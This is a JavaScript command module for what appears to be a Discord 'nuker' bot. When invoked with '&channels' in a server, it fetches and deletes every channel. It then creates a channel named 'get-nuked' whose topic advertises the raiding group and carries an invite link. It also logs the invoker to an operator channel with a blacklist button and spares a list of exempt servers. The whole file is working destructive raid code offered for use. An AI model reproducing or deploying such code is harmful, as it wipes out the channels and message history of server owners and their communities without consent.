const { ButtonBuilder, ButtonStyle, ActionRowBuilder, ComponentType, ChannelType } = require('discord.js');
const fs = require('fs');

module.exports = {
    name: 'channels',
    description: 'Deletes all channels in the server.',
    prefix: '&',
    async execute(msg, client, channel_logs, blacklist_user, idservidores_nopermitidos) {
        try {
            const blacklist_pecausa = new ButtonBuilder()
                .setCustomId('xdxd')
                .setLabel('Blacklist User')
                .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
                .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({ components: [equisde], content: `Command **channels** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})` });
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int) => {
                if (int.customId === "xdxd") {
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]", "");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json', asd);
                    int.reply({ content: `> Usuario en blacklist.` });
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if (idservidores_nopermitidos.includes(msg.guild.id)) {
            await msg.channel.send({ content: `> Ese servidor no está permitido.` });
            return;
        };
        let channelsssxdxd = await msg.guild.channels.fetch();
        for (const ch of channelsssxdxd.values()) {
            ch.delete();
        };
        await msg.guild.channels.create({ name: "get-nuked", type: ChannelType.GuildText, topic: 'zenx on top bro https://discord.gg/kEB3PCPkzc' });
    }
};
